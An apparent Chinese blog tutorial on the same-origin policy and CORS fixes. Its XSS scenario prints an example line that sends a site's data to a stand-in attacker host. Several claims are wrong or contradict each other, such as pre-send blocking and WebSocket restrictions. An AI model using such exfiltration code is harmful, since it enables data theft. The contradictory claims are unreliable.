---
layout: post
title: "Ajax cross-domain issue"
subtitle: ' "cross-domain"'
date: 2026-04-13 14:00:00
author: "LanZinYtt"
header-img: ""
catalog: true
tags:
---

# JS AJAX跨域分析

## 一、什么是跨域？同源问题会引发什么问题？

### 1.1 同源策略（Same-Origin Policy）

**同源** 是指协议、域名、端口都相同。浏览器的同源策略是一种安全机制，它限制来自一个源的文档或脚本与来自另一个源的资源进行交互。

```javascript
// 示例：以下对于 http://example.com:8000 来说都是"不同源"的
http://example.com:8001      // 端口不同
https://example.com:8000     // 协议不同
http://subdomain.example.com // 域名不同
http://other.com:8000        // 域名完全不同
```

**同源**的例子：
```javascript
// 这些都是同源的（相对于 http://example.com:8000）
http://example.com:8000/page1
http://example.com:8000/path/page2
http://example.com:8000/api/data
```

### 1.2 什么是跨域请求？

**跨域请求** 是指当前网页的 URL 与要请求资源的 URL 的协议、域名或端口任意一项不同时，所发起的请求。最常见的场景是使用 AJAX（XMLHttpRequest 或 Fetch API）从前端向不同源的服务器发送请求。

```javascript
// 在 http://example.com 中发起的请求
fetch('http://api.other-domain.com/data')  // 这是一个跨域请求
```

**实际场景示例：**
- 用户访问 `https://blog.example.com`
- 网页中的 JavaScript 需要从 `https://api.example.com` 获取数据
- 这就是一个跨域请求（不同的子域也算跨域）

### 1.2.1 为什么会产生跨域请求的需求？

在现代 Web 架构中，跨域请求非常常见：

1. **前后端分离架构**
   ```
   前端服务器: https://frontend.com (提供UI)
   后端服务器: https://backend.com (提供API)
   ```

2. **使用第三方 API**
   ```javascript
   // 从应用中调用 GitHub API
   fetch('https://api.github.com/users/octocat')
   
   // 使用高德地图 API
   fetch('https://amap.com/api/data')
   ```

3. **跨子域通信**
   ```
   app.example.com  → 请求  →  api.example.com
   ```

4. **内容分发网络（CDN）**
   ```
   主域名网站请求来自CDN的图片、JS、CSS等资源
   ```

### 1.3 为什么浏览器会阻止跨域请求？— 安全原因

#### 1.3.1 同源策略的安全目的

浏览器之所以阻止跨域请求，是出于 **安全考虑**。假如没有同源策略会发生什么？

**场景 1：XSS 攻击**

```
用户访问 → https://bank.com (真实的银行网站)
     ↓
网页中有恶意 JS 代码（比如通过 XSS 漏洞注入）
     ↓
恶意代码执行：fetch('https://attacker.com/steal-data')
     ↓
银行网站的敏感数据（Session、Cookies、DOM内容）被发送给攻击者
```

如果没有同源策略，恶意代码可以任意读取银行网站的 Cookie、LocalStorage，甚至是 DOM 内容中的用户隐私信息。

**场景 2：Session 劫持**

```
用户已登录于 → https://facebook.com (已有认证 Cookie)
     ↓
访问恶意网站 → https://attacker.com
     ↓
恶意网站的 JS 尝试：
  fetch('https://facebook.com/api/user-profile', 
        { credentials: 'include' })  // 自动携带 Facebook 的 Cookie
     ↓
如果没有 CORS 保护，就能获取用户的 Facebook 个人信息
```

**场景 3：数据盗取**

```
用户在公司内网访问 → https://internal-system.company.com
     ↓
访问了恶意网站 → https://evil.com
     ↓
恶意网站的 JS 代码尝试获取内网系统数据：
  fetch('https://internal-system.company.com/api/employees')
     ↓
公司内网的敏感数据（员工信息、薪资等）被窃取
```

#### 1.3.2 同源策略的两层防控

同源策略通过两层防控来保护用户：

**第一层：浏览器发送请求前的检查**
```
JavaScript 线程
    ↓
[检查目标域名] 是否与当前页面同源？
    ↓
  不同源? → 直接阻止，不发送请求
     ↓
  同源? → 允许发送
```

**第二层：浏览器收到响应后的检查**
```
网络请求返回响应
    ↓
[检查响应头] Access-Control-Allow-Origin 是否包含当前源？
    ↓
  没有或不匹配? → 浏览器拒绝让 JS 读取响应内容
           （但服务器已经收到请求并处理了）
     ↓
  匹配? → 允许 JS 代码访问响应数据
```

#### 1.3.3 关键点理解

重要的是要明白：

1. **请求会送到服务器，但浏览器阻止了响应**
   ```javascript
   fetch('http://attacker.com/steal-data')
   // ✅ 请求确实发到了服务器
   // ❌ 但浏览器不让 JS 代码读响应内容
   ```

2. **只有 JavaScript 代码受限**
   ```
   <img src="http://other.com/image.jpg">  ✅ 允许（不是 AJAX）
   <script src="http://other.com/lib.js"></script>  ✅ 允许（不是 AJAX）
   fetch('http://other.com/data')  ❌ 被阻止（是 AJAX）
   ```

3. **这不是网络限制，是浏览器的策略**
   ```
   服务器端-to-服务器端通信  ✅ 无限制（比如用 Node.js 调用其他 API）
   浏览器-to-服务器通信     ❌ 受同源策略限制
   ```

### 1.4 同源策略会引发什么问题？

当发起跨域请求时，浏览器会受到同源策略的限制，导致以下问题：

#### 1.4.1 CORS 错误（最常见）

```
Access to XMLHttpRequest at 'http://api.example.com/data' from origin 'http://localhost:3000' 
has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.
```

浏览器会阻止跨域请求的响应，即使服务器返回了数据（实际上请求已经到达服务器），浏览器仍然不会让 JavaScript 代码访问响应内容。

#### 1.4.2 XHR 和 Fetch 请求被拦截

```javascript
// 这些情况下浏览器会直接拒绝：
fetch('https://api.github.com/users/github')  // 被同源策略拦截
$.ajax({
  url: 'http://different-domain.com/api',
  type: 'GET'
})  // 被同源策略拦截
```

#### 1.4.3 Cookie、LocalStorage、SessionStorage 无法访问

```javascript
// 不同源的资源无法相互访问存储数据
// 在 http://a.com 中无法读取 http://b.com 的 Cookie
```

### 1.5 哪些操作受同源策略限制？

| 操作 | 受限制 | 说明 |
|-----|-------|------|
| AJAX 请求 | ✅ | 最核心的限制 |
| Fetch API | ✅ | 现代的请求方式 |
| WebSocket | ✅ | 需要检查 Origin 头 |
| Cookie 访问 | ✅ | 跨源无法读写 |
| LocalStorage | ✅ | 严格隔离 |
| \<img\> 标签 | ❌ | 允许任何源 |
| \<script\> 标签 | ❌ | JSONP 就是利用这一点 |
| \<link\> 标签 | ❌ | 允许任何源 |

---

## 二、怎么解决跨域问题？

### 2.1 CORS（跨域资源共享）- 推荐方案

CORS 是现代解决跨域问题的标准方法。服务器通过设置 HTTP 响应头来告诉浏览器允许来自特定源的请求。

#### 2.1.1 服务器端配置（Node.js/Express 示例）

```javascript
const express = require('express');
const app = express();

// 方式 1：允许所有源（开发环境）
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});

// 方式 2：允许指定源（生产环境推荐）
const allowedOrigins = ['http://localhost:3000', 'https://example.com'];
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.header('Access-Control-Allow-Origin', origin);
  }
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.header('Access-Control-Allow-Credentials', 'true');
  next();
});

// 处理 preflight 请求
app.options('*', (req, res) => {
  res.sendStatus(200);
});

app.get('/api/data', (req, res) => {
  res.json({ message: 'Success!' });
});
```

#### 2.1.2 使用 CORS 中间件

```javascript
const cors = require('cors');
const express = require('express');
const app = express();

// 基础配置
app.use(cors());

// 高级配置
app.use(cors({
  origin: ['http://localhost:3000', 'https://example.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
  maxAge: 3600
}));
```

#### 2.1.3 前端发送请求

```javascript
// 简单请求（自动发送）
fetch('http://api.example.com/data', {
  method: 'GET',
  credentials: 'include'  // 需要携带认证信息时使用
})
.then(response => response.json())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));

// 带自定义头的请求（会触发 preflight）
fetch('http://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer token'
  },
  body: JSON.stringify({ key: 'value' })
})
```

### 2.2 JSONP（旧方案，不推荐）

JSONP 利用 \<script\> 标签不受同源策略限制的特点来实现跨域请求。

```javascript
// 利用 <script> 标签的 src 属性请求
function jsonp(url, callback) {
  const script = document.createElement('script');
  script.src = url + '?callback=' + callback;
  document.body.appendChild(script);
}

// 回调函数
function handleResponse(data) {
  console.log(data);
}

// 发起请求
jsonp('http://api.example.com/data', 'handleResponse');
```

**缺点：**
- 只支持 GET 请求
- 容易被 XSS 攻击
- 没有错误处理机制
- 需要后端配合修改响应格式

### 2.3 代理服务器

利用同源策略只限制浏览器的特点，通过后端代理来转发请求。

#### 2.3.1 Webpack 开发服务器代理（开发环境）

```javascript
// webpack.config.js 或 vue.config.js
module.exports = {
  devServer: {
    proxy: {
      '/api': {
        target: 'http://api.example.com',
        changeOrigin: true,
        pathRewrite: {
          '^/api': ''
        }
      }
    }
  }
};
```

前端代码：
```javascript
// 请求 /api/data 会被代理到 http://api.example.com/data
fetch('/api/data')
  .then(response => response.json())
  .then(data => console.log(data));
```

#### 2.3.2 后端代理

```javascript
const express = require('express');
const axios = require('axios');
const app = express();

app.get('/proxy-api', async (req, res) => {
  try {
    const response = await axios.get('http://api.example.com/data');
    res.json(response.data);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
```

### 2.4 WebSocket

WebSocket 不受同源策略限制，可以用于实时双向通信。

```javascript
// 客户端
const ws = new WebSocket('ws://api.example.com:8080');

ws.onopen = () => {
  console.log('Connected');
  ws.send('Hello Server');
};

ws.onmessage = (event) => {
  console.log('Received:', event.data);
};

ws.onerror = (error) => {
  console.error('WebSocket error:', error);
};
```

### 2.5 降域（Same-Domain Cookie）

在某些复杂场景中，可以让两个不同的子域共享 cookie。

```javascript
// 在 a.example.com 和 b.example.com 中都设置
document.domain = 'example.com';

// 现在两个域可以相互访问 cookies
```

**注意：** 现代 Web 开发中不推荐使用此方法。

### 2.6 方案对比表

| 方案 | 优点 | 缺点 | 适用场景 |
|-----|------|------|---------|
| **CORS** | 标准方案，功能完整，安全性好 | 需要服务器配合 | 现代 Web 应用（推荐） |
| **JSONP** | 兼容旧浏览器，实现简单 | 只支持 GET，安全隐患 | 不推荐，仅作为遗留支持 |
| **代理服务器** | 灵活，可做请求转换 | 增加后端负担，延迟增加 | 开发环境、无法修改源服务器 |
| **WebSocket** | 实时双向通信，不限制源 | 实现复杂，连接维护成本高 | 实时数据推送、聊天应用 |

---

## 三、常见问题解答

### Q1: 为什么 CORS preflight 请求发送了两次 POST 请求？

A: 当发送非简单请求时（如使用自定义头、或 Content-Type 不是 form-data），浏览器会自动发送 preflight 请求（OPTIONS方法），询问服务器是否允许。只有收到许可后，才会发送实际的 POST 请求。

### Q2: 如何在携带认证信息的情况下发送跨域请求？

A: 需要在请求和响应中都做特殊处理：

```javascript
// 前端
fetch('http://api.example.com/data', {
  credentials: 'include'  // 重要！
})

// 后端
res.header('Access-Control-Allow-Credentials', 'true');
res.header('Access-Control-Allow-Origin', 'http://localhost:3000');  // 不能是 '*'
```

### Q3: 静态资源（CSS、JS、图片）为什么不受CORS限制？

A: 因为 CSS、JS、图片等资源的加载由 \<link\>、\<script\>、\<img\> 等标签完成，而不是 AJAX 请求，所以不受同源策略限制。这是浏览器有意设计的。

